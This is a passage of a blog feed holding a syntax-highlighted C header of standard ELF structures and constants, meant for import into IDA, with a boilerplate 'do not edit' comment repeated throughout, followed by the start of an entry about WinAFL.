class="meta-keyword">define</span> DT_ADDRRNGHI 0x6ffffeff</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_VERSYM 0x6ffffff0</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELACOUNT 0x6ffffff9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELCOUNT 0x6ffffffa</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_FLAGS_1 0x6ffffffb</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_VERDEF 0x6ffffffc</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_VERDEFNUM 0x6ffffffd</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_VERNEED 0x6ffffffe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_VERNEEDNUM 0x6fffffff</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OLD_DT_HIOS 0x6fffffff</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_LOPROC 0x70000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_HIPROC 0x7fffffff</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STB_LOCAL 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STB_GLOBAL 1</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STB_WEAK 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STT_NOTYPE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STT_OBJECT 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STT_FUNC 2</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STT_SECTION 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STT_FILE 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STT_COMMON 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STT_TLS 6</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_ST_BIND(x) ((x) &gt;&gt; 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_ST_TYPE(x) (((unsigned int) x) &amp; 0xf)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_BIND(x) ELF_ST_BIND(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_TYPE(x) ELF_ST_TYPE(x)</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_BIND(x) ELF_ST_BIND(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_TYPE(x) ELF_ST_TYPE(x)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dynamic</span>&#123;</span></span><br><span class="line"> Elf32_Sword d_tag;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> <span class="keyword">union</span>&#123;</span><br><span class="line"> Elf32_Sword d_val;</span><br><span class="line"> Elf32_Addr d_ptr;</span><br><span class="line"> &#125; d_un;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"> Elf64_Sxword d_tag;</span><br><span class="line"> <span class="keyword">union</span> &#123;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf64_Xword d_val;</span><br><span class="line"> Elf64_Addr d_ptr;</span><br><span class="line"> &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(x) ((x) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(x) ((x) &amp; 0xff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_SYM(i) ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_TYPE(i) ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_rel</span> &#123;</span></span><br><span class="line"> Elf32_Addr r_offset;</span><br><span class="line"> Elf32_Word r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_rel</span> &#123;</span></span><br><span class="line"> Elf64_Addr r_offset;</span><br><span class="line"> Elf64_Xword r_info;</span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_rela</span>&#123;</span></span><br><span class="line"> Elf32_Addr r_offset;</span><br><span class="line"> Elf32_Word r_info;</span><br><span class="line"> Elf32_Sword r_addend;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line">&#125; Elf32_Rela;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_rela</span> &#123;</span></span><br><span class="line"> Elf64_Addr r_offset;</span><br><span class="line"> Elf64_Xword r_info;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf64_Sxword r_addend;</span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_sym</span>&#123;</span></span><br><span class="line"> Elf32_Word st_name;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf32_Addr st_value;</span><br><span class="line"> Elf32_Word st_size;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf32_Half st_shndx;</span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_sym</span> &#123;</span></span><br><span class="line"> Elf64_Word st_name;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line"> Elf64_Half st_shndx;</span><br><span class="line"> Elf64_Addr st_value;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf64_Xword st_size;</span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_NIDENT 16</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_hdr</span>&#123;</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT];</span><br><span class="line"> Elf32_Half e_type;</span><br><span class="line"> Elf32_Half e_machine;</span><br><span class="line"> Elf32_Word e_version;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf32_Addr e_entry;</span><br><span class="line"> Elf32_Off e_phoff;</span><br><span class="line"> Elf32_Off e_shoff;</span><br><span class="line"> Elf32_Word e_flags;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf32_Half e_ehsize;</span><br><span class="line"> Elf32_Half e_phentsize;</span><br><span class="line"> Elf32_Half e_phnum;</span><br><span class="line"> Elf32_Half e_shentsize;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf32_Half e_shnum;</span><br><span class="line"> Elf32_Half e_shstrndx;</span><br><span class="line">&#125; Elf32_Ehdr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_hdr</span> &#123;</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT];</span><br><span class="line"> Elf64_Half e_type;</span><br><span class="line"> Elf64_Half e_machine;</span><br><span class="line"> Elf64_Word e_version;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf64_Addr e_entry;</span><br><span class="line"> Elf64_Off e_phoff;</span><br><span class="line"> Elf64_Off e_shoff;</span><br><span class="line"> Elf64_Word e_flags;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf64_Half e_ehsize;</span><br><span class="line"> Elf64_Half e_phentsize;</span><br><span class="line"> Elf64_Half e_phnum;</span><br><span class="line"> Elf64_Half e_shentsize;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf64_Half e_shnum;</span><br><span class="line"> Elf64_Half e_shstrndx;</span><br><span class="line">&#125; Elf64_Ehdr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PF_R 0x4</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PF_W 0x2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PF_X 0x1</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_phdr</span>&#123;</span></span><br><span class="line"> Elf32_Word p_type;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf32_Off p_offset;</span><br><span class="line"> Elf32_Addr p_vaddr;</span><br><span class="line"> Elf32_Addr p_paddr;</span><br><span class="line"> Elf32_Word p_filesz;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf32_Word p_memsz;</span><br><span class="line"> Elf32_Word p_flags;</span><br><span class="line"> Elf32_Word p_align;</span><br><span class="line">&#125; Elf32_Phdr;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_phdr</span> &#123;</span></span><br><span class="line"> Elf64_Word p_type;</span><br><span class="line"> Elf64_Word p_flags;</span><br><span class="line"> Elf64_Off p_offset;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf64_Addr p_vaddr;</span><br><span class="line"> Elf64_Addr p_paddr;</span><br><span class="line"> Elf64_Xword p_filesz;</span><br><span class="line"> Elf64_Xword p_memsz;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf64_Xword p_align;</span><br><span class="line">&#125; Elf64_Phdr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHT_NULL 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHT_PROGBITS 1</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHT_SYMTAB 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHT_STRTAB 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHT_RELA 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHT_HASH 5</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHT_DYNAMIC 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHT_NOTE 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHT_NOBITS 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHT_REL 9</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHT_SHLIB 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHT_DYNSYM 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHT_NUM 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHT_LOPROC 0x70000000</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHT_HIPROC 0x7fffffff</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHT_LOUSER 0x80000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHT_HIUSER 0xffffffff</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHF_WRITE 0x1</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHF_ALLOC 0x2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHF_EXECINSTR 0x4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHF_MASKPROC 0xf0000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHN_UNDEF 0</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHN_LORESERVE 0xff00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHN_LOPROC 0xff00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHN_HIPROC 0xff1f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHN_ABS 0xfff1</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHN_COMMON 0xfff2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHN_HIRESERVE 0xffff</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_shdr</span> &#123;</span></span><br><span class="line"> Elf32_Word sh_name;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf32_Word sh_type;</span><br><span class="line"> Elf32_Word sh_flags;</span><br><span class="line"> Elf32_Addr sh_addr;</span><br><span class="line"> Elf32_Off sh_offset;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf32_Word sh_size;</span><br><span class="line"> Elf32_Word sh_link;</span><br><span class="line"> Elf32_Word sh_info;</span><br><span class="line"> Elf32_Word sh_addralign;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf32_Word sh_entsize;</span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_shdr</span> &#123;</span></span><br><span class="line"> Elf64_Word sh_name;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf64_Word sh_type;</span><br><span class="line"> Elf64_Xword sh_flags;</span><br><span class="line"> Elf64_Addr sh_addr;</span><br><span class="line"> Elf64_Off sh_offset;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf64_Xword sh_size;</span><br><span class="line"> Elf64_Word sh_link;</span><br><span class="line"> Elf64_Word sh_info;</span><br><span class="line"> Elf64_Xword sh_addralign;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf64_Xword sh_entsize;</span><br><span class="line">&#125; Elf64_Shdr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_MAG0 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_MAG1 1</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_MAG2 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_MAG3 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_CLASS 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_DATA 5</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_VERSION 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_OSABI 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_PAD 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFMAG0 0x7f</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFMAG1 <span class="meta-string">'E'</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFMAG2 <span class="meta-string">'L'</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFMAG3 <span class="meta-string">'F'</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFMAG <span class="meta-string">"\177ELF"</span></span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SELFMAG 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFCLASSNONE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFCLASS32 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFCLASS64 2</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFCLASSNUM 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFDATANONE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFDATA2LSB 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFDATA2MSB 2</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EV_NONE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EV_CURRENT 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EV_NUM 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFOSABI_NONE 0</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFOSABI_LINUX 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ELF_OSABI</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_OSABI ELFOSABI_NONE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_PRSTATUS 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_PRFPREG 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_PRPSINFO 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_TASKSTRUCT 4</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_AUXV 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_SIGINFO 0x53494749</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_FILE 0x46494c45</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_PRXFPREG 0x46e62b7f</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_PPC_VMX 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_PPC_SPE 0x101</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_PPC_VSX 0x102</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_386_TLS 0x200</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_386_IOPERM 0x201</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_X86_XSTATE 0x202</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_S390_HIGH_GPRS 0x300</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_S390_TIMER 0x301</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_S390_TODCMP 0x302</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_S390_TODPREG 0x303</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_S390_CTRS 0x304</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_S390_PREFIX 0x305</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_S390_LAST_BREAK 0x306</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_S390_SYSTEM_CALL 0x307</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_S390_TDB 0x308</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_ARM_VFP 0x400</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_ARM_TLS 0x401</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_ARM_HW_BREAK 0x402</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_ARM_HW_WATCH 0x403</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_METAG_CBUF 0x500</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_METAG_RPIPE 0x501</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_METAG_TLS 0x502</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_note</span> &#123;</span></span><br><span class="line"> Elf32_Word n_namesz;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf32_Word n_descsz;</span><br><span class="line"> Elf32_Word n_type;</span><br><span class="line">&#125; Elf32_Nhdr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_note</span> &#123;</span></span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"> Elf64_Word n_namesz;</span><br><span class="line"> Elf64_Word n_descsz;</span><br><span class="line"> Elf64_Word n_type;</span><br><span class="line">&#125; Elf64_Nhdr;</span><br><span class="line"><span class="comment">/* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;可以直接在IDA导入的elf头文件&lt;br&gt;
    
    </summary>
    
    
      <category term="IDA" scheme="http://www.ench4nt3r.com/tags/IDA/"/>
    
      <category term="elf头文件" scheme="http://www.ench4nt3r.com/tags/elf%E5%A4%B4%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>浅谈Winafl</title>
    <link href="http://www.ench4nt3r.com/2016/12/17/winafl-analysis/"/>
    <id>http://www.ench4nt3r.com/2016/12/17/winafl-analysis/</id>
    <published>2016-12-16T16:00:00.000Z</published>
    <updated>2017-07-15T15:20:28.000Z</updated>
    
